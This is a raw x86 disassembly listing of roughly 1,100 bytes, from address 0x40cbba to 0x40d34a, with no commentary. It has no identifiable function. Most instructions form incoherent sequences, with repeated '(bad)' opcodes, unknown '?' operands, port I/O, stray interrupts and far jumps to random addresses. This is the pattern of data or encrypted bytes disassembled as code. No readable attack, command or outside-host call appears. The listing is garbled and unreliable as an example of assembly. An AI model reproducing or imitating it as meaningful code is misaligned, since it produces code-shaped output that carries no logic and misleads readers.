  40cbba:	add    ecx,DWORD PTR [ebx]
  40cbbc:	jecxz  0x40cbfb
  40cbbe:	pop    edi
  40cbbf:	jae    0x40cb5c
  40cbc1:	aam    0xdb
  40cbc3:	xchg   DWORD PTR [esi],esi
  40cbc5:	out    0x2a,al
  40cbc7:	pushf  
  40cbc8:	mov    BYTE PTR [ebx-0x677f116],al
  40cbce:	lods   al,BYTE PTR ds:[esi]
  40cbcf:	and    bl,dl
  40cbd1:	push   ebp
  40cbd2:	cs pop ss
  40cbd4:	fcom   DWORD PTR [edi-0x7b]
  40cbd7:	jne    0x40cbc6
  40cbd9:	xor    ecx,0x40795bc1
  40cbdf:	in     al,0xdf
  40cbe1:	dec    ebp
  40cbe2:	adc    ah,0x44
  40cbe5:	cmp    bl,BYTE PTR [ecx]
  40cbe7:	dec    esp
  40cbe8:	div    DWORD PTR [ebx-0xa]
  40cbeb:	test   BYTE PTR [edi],bl
  40cbed:	xlat   BYTE PTR ds:[ebx]
  40cbee:	mov    cl,0x52
  40cbf0:	test   BYTE PTR [edi-0x5b],ah
  40cbf3:	mov    bl,0x4
  40cbf5:	mov    ecx,0xa69bd2bb
  40cbfa:	push   ss
  40cbfb:	ss scas al,BYTE PTR es:[edi]
  40cbfd:	imul   eax,DWORD PTR [edi+0x2cacd752],0x35a76fa6
  40cc07:	test   dl,0xa6
  40cc0a:	int    0x89
  40cc0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc0d:	push   ebx
  40cc0e:	push   ds
  40cc0f:	dec    ecx
  40cc10:	inc    ebx
  40cc11:	jnp    0x40cc87
  40cc13:	fs push esp
  40cc15:	js     0x40cbfe
  40cc17:	test   eax,0x9f7dd94b
  40cc1c:	jae    0x40cc13
  40cc1e:	adc    eax,0xd2f506d0
  40cc23:	pop    ebx
  40cc24:	xlat   BYTE PTR ds:[ebx]
  40cc25:	mov    fs,WORD PTR [edi-0x517467dd]
  40cc2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc2c:	adc    eax,0x27d85974
  40cc31:	mov    WORD PTR [esi-0x3f],?
  40cc34:	xor    al,BYTE PTR [ecx]
  40cc36:	das    
  40cc37:	cmc    
  40cc38:	jbe    0x40cc81
  40cc3a:	push   ebp
  40cc3b:	sar    BYTE PTR [edx+0x1a],cl
  40cc3e:	pop    edi
  40cc40:	test   al,0x4b
  40cc42:	scas   al,BYTE PTR es:[edi]
  40cc43:	jmp    0x355bb799
  40cc48:	cmp    BYTE PTR [ecx-0x6b],bl
  40cc4b:	mov    bh,0x5d
  40cc4d:	(bad)
  40cc50:	or     BYTE PTR [ebp-0x30c21d7f],bl
  40cc56:	pop    es
  40cc57:	call   0xe1e5802d
  40cc5c:	repz test BYTE PTR [esi],ch
  40cc5f:	imul   edx,DWORD PTR [edi],0x5561ce0b
  40cc65:	idiv   BYTE PTR [eax-0x13732fe6]
  40cc6b:	push   edx
  40cc6c:	stos   DWORD PTR es:[edi],eax
  40cc6d:	adc    DWORD PTR [ecx+0x2a],ecx
  40cc70:	xlat   BYTE PTR ds:[ebx]
  40cc71:	push   eax
  40cc72:	fld    QWORD PTR [edi-0x14a40193]
  40cc78:	push   edx
  40cc79:	fucomip st,st(3)
  40cc7b:	sub    ah,BYTE PTR [ecx+ebp*8+0x45f7fbda]
  40cc82:	(bad)  
  40cc83:	cs mov ebx,0x5bed1299
  40cc89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc8a:	or     eax,0xfde9070a
  40cc8f:	cdq    
  40cc90:	outs   dx,BYTE PTR ds:[esi]
  40cc91:	jnp    0x40cc5b
  40cc93:	inc    ecx
  40cc94:	arpl   WORD PTR [edi-0x4f],bx
  40cc97:	bound  edx,QWORD PTR [ebp-0x7d]
  40cc9a:	jp     0x40cd00
  40cc9c:	adc    esi,DWORD PTR ds:0x9bdb14cd
  40cca2:	fdiv   QWORD PTR [eax]
  40cca4:	adc    ch,BYTE PTR [ebx]
  40cca6:	call   0xb516:0x131b6b59
  40ccad:	inc    ecx
  40ccae:	dec    ebx
  40ccaf:	leave  
  40ccb0:	pop    es
  40ccb1:	or     al,0x9c
  40ccb3:	mov    dh,0x1f
  40ccb5:	jb     0x40cc79
  40ccb7:	and    DWORD PTR [ecx],edx
  40ccb9:	repz xor eax,0xfe2c2d4e
  40ccbf:	aam    0x7e
  40ccc1:	rol    edi,1
  40ccc3:	(bad)  
  40ccc4:	daa    
  40ccc5:	das    
  40ccc6:	sub    DWORD PTR [edi+0x3b],0xffffffd8
  40ccca:	and    esp,edi
  40cccc:	pop    ebx
  40cccd:	push   ss
  40ccce:	inc    edx
  40cccf:	add    DWORD PTR [ecx-0x7d],esp
  40ccd2:	sbb    DWORD PTR [edx],eax
  40ccd4:	cmp    edi,DWORD PTR [edi+edi*2+0x1520e07f]
  40ccdb:	fcomp  QWORD PTR [esi-0x1c]
  40ccde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccdf:	(bad)  
  40cce1:	test   esp,edx
  40cce3:	xchg   ecx,eax
  40cce4:	add    al,0x4f
  40cce6:	enter  0xdfc2,0x97
  40ccea:	dec    esi
  40cceb:	xchg   DWORD PTR [ecx],eax
  40cced:	pusha  
  40ccee:	int    0xf7
  40ccf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccf1:	shr    DWORD PTR [edi+0x56],0x7c
  40ccf5:	lds    ebp,FWORD PTR [eax]
  40ccf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccf8:	mov    DWORD PTR [eax],esp
  40ccfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccfb:	fadd   DWORD PTR [edi]
  40ccfd:	mov    ecx,0x60240f99
  40cd02:	adc    cl,0xb4
  40cd05:	xor    DWORD PTR [edx],esp
  40cd07:	out    0xcf,al
  40cd09:	mov    ah,0xf2
  40cd0b:	xchg   ebx,eax
  40cd0c:	ss jg  0x40cca9
  40cd0f:	rcr    BYTE PTR [ebx+0x7b],cl
  40cd12:	addr16 test al,0xfc
  40cd15:	(bad)  
  40cd16:	retf   0xb8ea
  40cd19:	iret   
  40cd1a:	pushf  
  40cd1b:	inc    ecx
  40cd1c:	sbb    al,0xd7
  40cd1e:	sbb    DWORD PTR [esi-0x340ccbda],esi
  40cd24:	std    
  40cd25:	test   al,0xe9
  40cd27:	test   DWORD PTR [eax+ecx*8-0x1309fdee],0xfb609885
  40cd32:	out    0xa,eax
  40cd34:	and    eax,0x882f69ae
  40cd39:	outs   dx,BYTE PTR ds:[esi]
  40cd3a:	fstp   DWORD PTR ds:0xe01ffea9
  40cd40:	ds sub dh,dh
  40cd43:	mov    cl,0x9f
  40cd45:	xor    eax,0x51c8e595
  40cd4a:	aam    0x5e
  40cd4c:	jbe    0x40cd17
  40cd4e:	bound  ebp,QWORD PTR [edi-0x7e31e2d2]
  40cd54:	imul   ebx,DWORD PTR [eax],0xa2c136f8
  40cd5a:	in     al,0x1a
  40cd5c:	or     al,0xe7
  40cd5e:	mov    dl,0xb2
  40cd60:	mov    ds:0xa06c1f46,al
  40cd65:	jnp    0x40ccff
  40cd67:	adc    DWORD PTR [edx+0x21],ebx
  40cd6a:	gs pop ebp
  40cd6c:	sbb    esi,DWORD PTR [ebx-0xe]
  40cd6f:	xchg   ecx,eax
  40cd70:	fsubrp st(0),st
  40cd72:	mov    WORD PTR es:[esi+0x3fcb3c54],ds
  40cd79:	retf   
  40cd7a:	mov    ecx,0x3b059d9a
  40cd7f:	jns    0x40cdc8
  40cd81:	jmp    0x95ffb0ba
  40cd86:	ja     0x40cd7f
  40cd88:	int    0x3c
  40cd8a:	xor    esp,DWORD PTR [esi-0x58fc4f26]
  40cd90:	out    dx,al
  40cd91:	add    dh,ch
  40cd93:	fsubr  QWORD PTR ds:0x59ed4ba0
  40cd99:	pop    esp
  40cd9a:	inc    ecx
  40cd9b:	lods   eax,DWORD PTR gs:[esi]
  40cd9d:	(bad)  
  40cd9e:	xchg   ebp,eax
  40cd9f:	enter  0x4765,0x26
  40cda3:	in     al,0xe5
  40cda5:	inc    ebx
  40cda6:	les    ebp,FWORD PTR [esi-0x181b0724]
  40cdac:	out    0x11,al
  40cdae:	xchg   DWORD PTR [esi],edx
  40cdb0:	cmp    ch,BYTE PTR es:[edx-0x59]
  40cdb4:	cmp    eax,0xf9b20da1
  40cdb9:	and    ah,cl
  40cdbb:	in     al,0x8f
  40cdbd:	outs   dx,BYTE PTR ds:[esi]
  40cdbe:	stc    
  40cdbf:	xchg   BYTE PTR ds:0x76b279e5,dl
  40cdc5:	pop    ss
  40cdc6:	and    eax,0x19bdb29d
  40cdcb:	aad    0x18
  40cdcd:	adc    eax,0xdb97af2a
  40cdd2:	fs ja  0x40cdaa
  40cdd5:	lock repz scas eax,DWORD PTR es:[edi]
  40cdd8:	les    esi,FWORD PTR [edi-0x239e091b]
  40cdde:	idiv   BYTE PTR ds:0xcc0465f7
  40cde4:	mov    BYTE PTR [ecx+0x1f],dh
  40cde7:	add    ebx,ebx
  40cde9:	jno    0x40ce5b
  40cdeb:	or     BYTE PTR [edi-0x1f9fb1d0],dl
  40cdf1:	cmp    al,BYTE PTR [ebx+eiz*2-0x58]
  40cdf5:	sub    DWORD PTR [edi],ebp
  40cdf7:	and    BYTE PTR [edx-0x5d],al
  40cdfa:	cmp    BYTE PTR [ebx+0x43],cl
  40cdfd:	enter  0x5c6a,0xe8
  40ce01:	es pusha 
  40ce03:	adc    ch,BYTE PTR [esi]
  40ce05:	(bad)  
  40ce07:	mov    ecx,0x854d6dc7
  40ce0c:	or     ch,BYTE PTR [ebx]
  40ce0e:	adc    ah,ch
  40ce10:	sbb    ebx,DWORD PTR [ebp-0x2f56df62]
  40ce16:	fild   DWORD PTR [ebx-0x38754039]
  40ce1c:	cmp    edi,ebx
  40ce1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce1f:	leave  
  40ce20:	and    BYTE PTR [edi],bh
  40ce22:	jmp    0x1548a411
  40ce27:	in     eax,dx
  40ce28:	xor    BYTE PTR [ecx+0x40],ch
  40ce2b:	ret    
  40ce2c:	push   esi
  40ce2d:	jle    0x40cdba
  40ce2f:	leave  
  40ce30:	sbb    BYTE PTR [edi],ah
  40ce32:	clc    
  40ce33:	out    0x8a,al
  40ce35:	bound  ebx,QWORD PTR [ebp+esi*8-0x26eedf89]
  40ce3c:	xchg   ebx,eax
  40ce3d:	mov    ds:0x980d9ffc,eax
  40ce42:	adc    BYTE PTR [esi],cl
  40ce44:	cmp    eax,0xb972a2a4
  40ce49:	sahf   
  40ce4a:	rcl    BYTE PTR [ecx+0x7],1
  40ce4d:	inc    edi
  40ce4e:	mov    edx,DWORD PTR [edx-0x73]
  40ce51:	add    BYTE PTR [edx-0x53600b5],bl
  40ce57:	xor    al,0x7a
  40ce59:	cmp    bl,dl
  40ce5b:	leave  
  40ce5c:	bnd call 0x9b4240f4
  40ce62:	aad    0xe8
  40ce64:	sbb    eax,0x5ad657dc
  40ce69:	imul   ecx,eax,0xf8a6863b
  40ce6f:	pushf  
  40ce70:	xlat   BYTE PTR ds:[ebx]
  40ce71:	data16 std 
  40ce73:	push   esi
  40ce74:	ja     0x40cdfc
  40ce76:	ret    
  40ce77:	mov    esi,DWORD PTR ds:0xe94e2c75
  40ce7d:	or     DWORD PTR ds:0x160fa5cc,0x19
  40ce84:	adc    edi,ecx
  40ce86:	int    0xd5
  40ce88:	xor    al,0x93
  40ce8a:	loop   0x40cecb
  40ce8c:	outs   dx,BYTE PTR ss:[esi]
  40ce8e:	out    0x42,al
  40ce90:	adc    DWORD PTR [eax],ecx
  40ce92:	mov    eax,ds:0xa4b8e238
  40ce97:	out    dx,eax
  40ce98:	retf   0x5cbd
  40ce9b:	ds cmc 
  40ce9d:	sub    eax,0x96e1af0f
  40cea2:	add    al,dh
  40cea4:	cmp    eax,DWORD PTR ss:[eax]
  40cea7:	stc    
  40cea8:	popf   
  40cea9:	pusha  
  40ceaa:	cld    
  40ceab:	mov    ebx,0x1fa2fa56
  40ceb0:	loopne 0x40ce60
  40ceb2:	inc    ecx
  40ceb3:	sahf   
  40ceb4:	push   ss
  40ceb5:	sub    BYTE PTR [eax-0x21e38959],ch
  40cebb:	cmp    al,0x52
  40cebd:	out    dx,al
  40cebe:	jle    0x40ce40
  40cec0:	push   eax
  40cec1:	pop    edx
  40cec2:	hlt    
  40cec3:	jl     0x40ce78
  40cec5:	fist   WORD PTR [edi+0x65]
  40cec8:	scas   eax,DWORD PTR es:[edi]
  40cec9:	into   
  40ceca:	mov    dh,bl
  40cecc:	retf   0xd9d7
  40cecf:	sub    al,0xaa
  40ced1:	or     DWORD PTR [ecx-0x6ce342b9],0x5d
  40ced8:	mov    es,WORD PTR [edx+eax*8]
  40cedb:	pop    ebx
  40cedc:	ret    
  40cedd:	ret    0x9d02
  40cee0:	push   ds
  40cee1:	gs dec edx
  40cee3:	jl     0x40cf30
  40cee5:	xchg   ecx,eax
  40cee6:	ret    0x4c1a
  40cee9:	mov    esp,0x43a2f0f3
  40ceee:	stc    
  40ceef:	div    DWORD PTR ds:0xafd783ad
  40cef5:	xor    eax,0xb0febce1
  40cefa:	sub    al,0x7c
  40cefc:	jne    0x40cf5d
  40cefe:	or     dh,dl
  40cf00:	push   ecx
  40cf01:	test   eax,0xa3c6ef10
  40cf06:	std    
  40cf07:	cmp    BYTE PTR [eax],al
  40cf09:	mov    ebp,0x17a55dc5
  40cf0e:	push   ds
  40cf0f:	mov    bl,0xc2
  40cf11:	(bad)  
  40cf12:	or     BYTE PTR [edi+0x4b],0x4
  40cf16:	cmp    DWORD PTR [eax-0xf],0x30
  40cf1a:	sbb    al,0x91
  40cf1c:	sar    bh,cl
  40cf1e:	aam    0x5a
  40cf20:	cmc    
  40cf21:	call   0x6e3f:0x75d5a81
  40cf28:	stos   DWORD PTR es:[edi],eax
  40cf29:	sbb    BYTE PTR [esi+0x36],ah
  40cf2c:	or     eax,eax
  40cf2e:	shl    DWORD PTR [ecx],1
  40cf30:	aaa    
  40cf31:	data16 ins BYTE PTR es:[edi],dx
  40cf33:	xchg   esi,eax
  40cf34:	ret    
  40cf35:	xchg   ebx,eax
  40cf36:	cmp    BYTE PTR [edx-0x38ff686b],bl
  40cf3c:	pop    ds
  40cf3d:	dec    esi
  40cf3e:	lock xor al,0x7b
  40cf41:	into   
  40cf42:	jmp    0x40cf80
  40cf44:	test   eax,0xfa68b06d
  40cf49:	iret   
  40cf4a:	repz jb 0x40cf5e
  40cf4d:	arpl   WORD PTR [edx],di
  40cf4f:	aad    0xad
  40cf51:	or     eax,0xfc15c950
  40cf56:	sub    eax,0xf0e0140b
  40cf5b:	dec    eax
  40cf5c:	xchg   esp,eax
  40cf5e:	push   ebp
  40cf5f:	lods   al,BYTE PTR ds:[esi]
  40cf60:	jp     0x40cf5c
  40cf62:	imul   eax,DWORD PTR [ebx-0x7ad7d1f],0x52
  40cf69:	sub    al,0x30
  40cf6b:	inc    edx
  40cf6c:	nop
  40cf6d:	cmp    al,0x2a
  40cf6f:	or     BYTE PTR [eax+0x2],ah
  40cf72:	adc    eax,0x935b04ff
  40cf77:	in     eax,dx
  40cf78:	push   ds
  40cf79:	test   BYTE PTR [eax+0x6c08f190],dl
  40cf7f:	mov    ds:0x9afab7a9,al
  40cf84:	mov    ecx,0xd9f8a4c4
  40cf89:	sub    bh,BYTE PTR [edi-0x5b]
  40cf8c:	jl     0x40cfd6
  40cf8e:	push   esp
  40cf8f:	cdq    
  40cf90:	pop    es
  40cf91:	(bad)  
  40cf92:	pop    ds
  40cf93:	loopne 0x40cfef
  40cf95:	mov    eax,0xc4769002
  40cf9a:	cld    
  40cf9b:	cmp    DWORD PTR [ebx],edx
  40cf9d:	pop    edx
  40cf9e:	xor    eax,0xeb287870
  40cfa3:	cwde   
  40cfa4:	hlt    
  40cfa5:	ret    0x3e45
  40cfa8:	popf   
  40cfa9:	mov    esi,0x59afb733
  40cfae:	outs   dx,DWORD PTR ds:[esi]
  40cfaf:	mov    ebp,esi
  40cfb1:	cmp    eax,0x58ae04d7
  40cfb6:	in     eax,0x89
  40cfb8:	mov    esi,0x205678bc
  40cfbd:	stos   DWORD PTR es:[edi],eax
  40cfbe:	mov    cl,BYTE PTR [edx+0x30caa2b3]
  40cfc4:	arpl   WORD PTR [edx+0x286a34c],cx
  40cfca:	inc    esp
  40cfcb:	xchg   ebp,eax
  40cfcc:	dec    edx
  40cfcd:	(bad)  
  40cfce:	jmp    0xb9cb:0xa9fdc2b5
  40cfd5:	not    esi
  40cfd7:	ror    BYTE PTR [ecx+ecx*2],1
  40cfda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfdb:	sbb    eax,0xeb1b82de
  40cfe0:	ret    0x25e5
  40cfe3:	dec    ecx
  40cfe4:	dec    edi
  40cfe5:	pop    esp
  40cfe6:	jmp    0x3ca00d4
  40cfeb:	mov    ch,cl
  40cfed:	mov    BYTE PTR [eax],bl
  40cfef:	sub    edi,DWORD PTR [esi+0x724252d6]
  40cff5:	push   ecx
  40cff6:	clc    
  40cff7:	loope  0x40d06a
  40cff9:	sub    al,0x10
  40cffb:	outs   dx,BYTE PTR ds:[esi]
  40cffc:	fcomp  QWORD PTR [eax-0x35]
  40cfff:	inc    eax
  40d000:	lahf   
  40d001:	idiv   BYTE PTR [ebp+0x4eb1638a]
  40d007:	aas    
  40d008:	repz aaa 
  40d00a:	inc    edi
  40d00b:	scas   al,BYTE PTR es:[edi]
  40d00c:	ret    
  40d00d:	dec    eax
  40d00e:	jmp    0xc6888dbd
  40d013:	and    al,0x90
  40d015:	rcr    BYTE PTR [esi+0x3e],1
  40d018:	adc    ebx,DWORD PTR [eax-0x61d12d25]
  40d01e:	lds    edi,FWORD PTR [ebx-0x37]
  40d021:	push   esp
  40d022:	add    eax,0xe81e083d
  40d027:	rcl    DWORD PTR [edx-0x4a5e382c],0xbc
  40d02e:	mov    ebp,0x76e5458c
  40d033:	sub    DWORD PTR [ebx-0x2d058416],esp
  40d039:	mov    BYTE PTR [ebx+0x12],al
  40d03c:	mov    DWORD PTR [esi],ebp
  40d03e:	mov    cl,ch
  40d040:	popa   
  40d041:	xchg   edi,eax
  40d042:	mov    cl,0x34
  40d044:	data16 sub BYTE PTR [esi+ebp*2-0x64],al
  40d049:	fcmovnu st,st(0)
  40d04b:	push   es
  40d04c:	sbb    eax,0x51d5eaa0
  40d051:	inc    esi
  40d052:	xor    al,0x30
  40d054:	xchg   ebp,eax
  40d055:	sar    DWORD PTR [esi-0x42],1
  40d058:	ret    0xd3ed
  40d05b:	js     0x40cfe1
  40d05d:	sahf   
  40d05e:	rcr    DWORD PTR [ecx+0x54],cl
  40d061:	mov    edx,0xdaae7dbd
  40d066:	pop    es
  40d067:	sub    edx,esi
  40d069:	dec    eax
  40d06a:	and    al,0x18
  40d06d:	pushf  
  40d06e:	jge    0x40d0a1
  40d070:	les    edx,FWORD PTR ds:0x66d26e9e
  40d076:	mov    bl,0x4b
  40d078:	sbb    DWORD PTR [ebx-0x5e250da6],ebp
  40d07e:	jb     0x40d063
  40d080:	js     0x40d094
  40d082:	sbb    edx,DWORD PTR [edi+0xd]
  40d085:	push   edx
  40d086:	sub    BYTE PTR [esi],0x6b
  40d089:	inc    edx
  40d08a:	in     eax,0x19
  40d08c:	inc    esp
  40d08d:	outs   dx,BYTE PTR ds:[esi]
  40d08e:	out    0x24,eax
  40d090:	add    eax,0x79b00d1e
  40d095:	mov    ds:0xdd14a06f,eax
  40d09a:	and    BYTE PTR ds:0x7a4acc9f,0x54
  40d0a1:	cmp    DWORD PTR [edi+eax*4],0xa71973aa
  40d0a8:	shr    DWORD PTR [eax+0x2564391a],0x3d
  40d0af:	pop    ecx
  40d0b0:	ins    BYTE PTR es:[edi],dx
  40d0b1:	jmp    0x595b:0x934f1b71
  40d0b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0b9:	(bad)  
  40d0bb:	push   DWORD PTR [edi]
  40d0bd:	das    
  40d0be:	lock xacquire add BYTE PTR [ebx+ecx*1],bh
  40d0c3:	inc    edx
  40d0c4:	mov    bh,0xdf
  40d0c6:	sub    DWORD PTR [edx-0x56fc93f0],edx
  40d0cc:	dec    eax
  40d0cd:	iret   
  40d0ce:	and    BYTE PTR [eax-0x5e5f535],bh
  40d0d4:	call   0xc2cb2c81
  40d0d9:	mov    al,0x1
  40d0db:	pop    ds
  40d0dc:	push   eax
  40d0dd:	add    DWORD PTR ds:0x301241e4,edi
  40d0e3:	repnz mov DWORD PTR [esi-0x41594588],esp
  40d0ea:	jmp    0xef44:0x7796f0c0
  40d0f1:	push   0xffffffee
  40d0f3:	sar    BYTE PTR [esp+eax*2],0x55
  40d0f7:	popa   
  40d0f8:	xor    eax,0xa2fe06b9
  40d0fd:	mov    al,0x70
  40d0ff:	add    cl,BYTE PTR ds:0xec0333e6
  40d105:	sub    edi,0x825d795b
  40d10b:	sti    
  40d10c:	rcl    DWORD PTR [ebx+0xdd65e72],1
  40d112:	sbb    eax,DWORD PTR [ecx-0x42e648ab]
  40d118:	pusha  
  40d119:	stc    
  40d11a:	in     eax,dx
  40d11b:	xchg   eax,esp
  40d11d:	and    edx,DWORD PTR [edx-0x79]
  40d120:	ins    BYTE PTR es:[edi],dx
  40d121:	(bad)  
  40d123:	popa   
  40d124:	inc    esi
  40d125:	mov    ?,WORD PTR [esi+0x45]
  40d128:	std    
  40d129:	jne    0x40d0ef
  40d12b:	adc    esp,DWORD PTR [ebx]
  40d12d:	lds    ebp,FWORD PTR [ebx+esi*8]
  40d130:	xchg   ebp,eax
  40d131:	and    eax,0xe34b944f
  40d136:	jns    0x40d17a
  40d138:	mov    dh,0x4c
  40d13a:	mov    eax,DWORD PTR [eax+ebx*2+0x25]
  40d13e:	not    cl
  40d140:	jle    0x40d12b
  40d142:	inc    eax
  40d143:	dec    edx
  40d144:	and    al,0xeb
  40d146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d148:	jecxz  0x40d0f3
  40d14a:	xchg   ebp,eax
  40d14b:	jae    0x40d0fd
  40d14d:	sub    dl,dl
  40d14f:	xchg   esp,edi
  40d151:	dec    edx
  40d152:	outs   dx,BYTE PTR ds:[esi]
  40d153:	xor    DWORD PTR [ebp+0x3],ebp
  40d156:	daa    
  40d157:	cmp    eax,0xdc949d4d
  40d15c:	gs aas 
  40d15e:	(bad)  
  40d15f:	cmp    al,dh
  40d161:	frstor [eax]
  40d163:	push   0x54b86d78
  40d168:	in     al,0x1d
  40d16a:	aad    0x8f
  40d16c:	aas    
  40d16d:	mov    edx,0x56820a92
  40d172:	xor    al,BYTE PTR [edx+0x1b]
  40d175:	dec    ebp
  40d176:	cs xchg ebp,eax
  40d178:	pop    esi
  40d179:	or     eax,0x50bc28ea
  40d17e:	imul   BYTE PTR [esi]
  40d180:	jo     0x40d169
  40d182:	loope  0x40d1c3
  40d184:	test   BYTE PTR [edx+esi*4],ah
  40d187:	fidiv  WORD PTR [ecx+0x60]
  40d18a:	jbe    0x40d13f
  40d18c:	fnsave [esi+ebp*2]
  40d18f:	mov    al,BYTE PTR [ecx+ebp*1+0x55]
  40d193:	int    0x3b
  40d195:	mov    ds:0xa423b16e,al
  40d19a:	adc    al,0x4d
  40d19c:	mov    cl,0xfe
  40d19e:	adc    ch,BYTE PTR [edx-0x78]
  40d1a1:	aaa    
  40d1a2:	neg    BYTE PTR [ecx+0x17ee697f]
  40d1a8:	push   cs
  40d1a9:	push   es
  40d1aa:	inc    ebp
  40d1ab:	jne    0x40d22c
  40d1ad:	fs popf 
  40d1af:	push   0x651f6bb3
  40d1b4:	push   ss
  40d1b5:	mov    eax,0xe5a580b3
  40d1ba:	fidivr DWORD PTR [edx+0x323ec65b]
  40d1c0:	nop
  40d1c1:	sahf   
  40d1c2:	in     al,dx
  40d1c3:	sub    ebx,0xd79f2995
  40d1c9:	ins    BYTE PTR es:[edi],dx
  40d1ca:	sahf   
  40d1cb:	gs jmp 0x40d1d0
  40d1ce:	xor    cl,BYTE PTR [esi-0x6479b57f]
  40d1d4:	scas   eax,DWORD PTR es:[edi]
  40d1d5:	test   BYTE PTR [ecx+0x709b8803],cl
  40d1db:	sub    eax,0x6b26c4ec
  40d1e0:	and    cl,BYTE PTR [eax+0x6bfee2cf]
  40d1e6:	call   0x64af:0x381baac6
  40d1ed:	jl     0x40d220
  40d1ef:	xchg   edi,eax
  40d1f0:	add    al,0xae
  40d1f2:	mov    ch,0x93
  40d1f4:	mov    ch,0x36
  40d1f6:	add    al,0xda
  40d1f8:	das    
  40d1f9:	mov    bl,0x91
  40d1fb:	push   ds
  40d1fc:	jmp    0x40d258
  40d1fe:	inc    edx
  40d1ff:	sbb    BYTE PTR [ecx],cl
  40d201:	clc    
  40d202:	es outs dx,DWORD PTR es:[esi]
  40d205:	mov    esp,0x123c7544
  40d20a:	sub    BYTE PTR [esi],bh
  40d20c:	(bad)  
  40d20d:	icebp  
  40d20e:	daa    
  40d20f:	mov    ds,WORD PTR [edx+0x58deac1a]
  40d215:	xchg   esi,eax
  40d216:	out    0x2,eax
  40d218:	sbb    BYTE PTR [eax-0x30],bh
  40d21b:	mov    cl,0x1
  40d21d:	push   edx
  40d21e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d21f:	repz xor ecx,DWORD PTR [edi+0x1ca959ef]
  40d226:	int    0x28
  40d228:	cmp    al,0xc8
  40d22a:	sub    DWORD PTR [esi],ebx
  40d22c:	call   0x3df8beab
  40d231:	jbe    0x40d225
  40d233:	mov    ds:0x86f5cc0e,al
  40d238:	jp     0x40d1ba
  40d23a:	inc    edi
  40d23b:	add    eax,0x7dd20c36
  40d240:	mov    eax,0xb4afa33e
  40d245:	sbb    dl,BYTE PTR [edx+0x66a0885c]
  40d24b:	das    
  40d24c:	(bad)  
  40d24d:	push   esp
  40d24e:	jb     0x40d260
  40d250:	jmp    0x7c667cd2
  40d255:	dec    edx
  40d256:	test   DWORD PTR [edx],esi
  40d258:	mov    BYTE PTR [ecx-0x2b],bl
  40d25b:	aas    
  40d25c:	ror    DWORD PTR [esi-0x7a],cl
  40d25f:	repnz cli 
  40d261:	gs mov esi,0xcf37801f
  40d267:	jns    0x40d1ea
  40d269:	aaa    
  40d26a:	jns    0x40d2d6
  40d26c:	and    al,0xa4
  40d26e:	imul   ebp,DWORD PTR [edi+ebp*1-0xe],0xfffffff4
  40d273:	jnp    0x40d216
  40d275:	ja     0x40d2a6
  40d277:	jno    0x40d214
  40d279:	push   ebx
  40d27a:	loopne 0x40d27d
  40d27c:	(bad)  
  40d27d:	fisttp WORD PTR ds:0xd4e147be
  40d283:	in     al,0x9e
  40d285:	mov    ds:0x779735d9,eax
  40d28a:	rol    edx,0x69
  40d28d:	cmp    BYTE PTR [edi-0x4c213dc],bl
  40d293:	mov    ah,BYTE PTR [ecx+0x2]
  40d296:	xor    ah,dh
  40d298:	pusha  
  40d299:	push   ebx
  40d29a:	lods   al,BYTE PTR ds:[esi]
  40d29b:	adc    bh,BYTE PTR [ebp*8+0x26f755ad]
  40d2a2:	mov    ebp,DWORD PTR [eax+ecx*4]
  40d2a5:	nop
  40d2a6:	jg     0x40d244
  40d2a8:	or     DWORD PTR [esp+ebp*1+0x371a8661],eax
  40d2af:	xchg   esp,esp
  40d2b1:	jp     0x40d31d
  40d2b3:	fisttp QWORD PTR [ecx-0x43]
  40d2b6:	sub    eax,0x463ad4dd
  40d2bb:	pop    eax
  40d2bc:	cmp    BYTE PTR [ebp+0x4e6e148f],cl
  40d2c2:	fnstcw WORD PTR [ecx+0x5c5bf9b2]
  40d2c8:	enter  0x61b7,0x8c
  40d2cc:	je     0x40d252
  40d2ce:	add    al,cl
  40d2d0:	mov    gs,WORD PTR [eax+ebx*1-0x15]
  40d2d4:	gs or  al,0x94
  40d2d7:	jecxz  0x40d343
  40d2d9:	fcmovnbe st,st(7)
  40d2db:	popf   
  40d2dc:	and    bl,0xf4
  40d2df:	inc    eax
  40d2e0:	call   0x169e:0xdf86cf07
  40d2e7:	adc    DWORD PTR [ecx+0x9],edx
  40d2ea:	iret   
  40d2eb:	jmp    0x6ad5a735
  40d2f0:	daa    
  40d2f1:	ja     0x40d2f5
  40d2f3:	mov    bl,0xcb
  40d2f5:	pop    esp
  40d2f6:	inc    ebx
  40d2f7:	cmp    BYTE PTR [edi+0x29ae8350],cl
  40d2fd:	add    al,0xa0
  40d2ff:	cmp    ecx,esp
  40d301:	xchg   edx,eax
  40d303:	mov    DWORD PTR [edi],ecx
  40d305:	pop    ebp
  40d306:	dec    BYTE PTR [eax-0x29]
  40d309:	sbb    eax,0x9a265a0d
  40d30e:	dec    BYTE PTR [eax-0x10d5fbc8]
  40d314:	cmp    al,BYTE PTR [edx+0x2c]
  40d317:	rcl    BYTE PTR [edi-0x80],0xa4
  40d31b:	test   BYTE PTR [esi+0x6f10edb2],bl
  40d321:	popa   
  40d322:	aad    0xc9
  40d324:	cmp    al,0x3e
  40d326:	ins    DWORD PTR es:[edi],dx
  40d327:	mov    ch,0x7d
  40d329:	or     DWORD PTR [edx-0x1f1e467b],0xb01a5bff
  40d333:	or     DWORD PTR [edi-0x74],edi
  40d336:	imul   edi,DWORD PTR [ebp+0x17dd53c0],0x35865741
  40d340:	outs   dx,DWORD PTR ds:[esi]
  40d341:	fld    st(1)
  40d343:	add    DWORD PTR [eax],edx
  40d345:	cld    
  40d346:	in     eax,dx
  40d347:	ins    DWORD PTR es:[edi],dx
  40d348:	pop    esi
  40d349:	cli    
  40d34a:	iret   
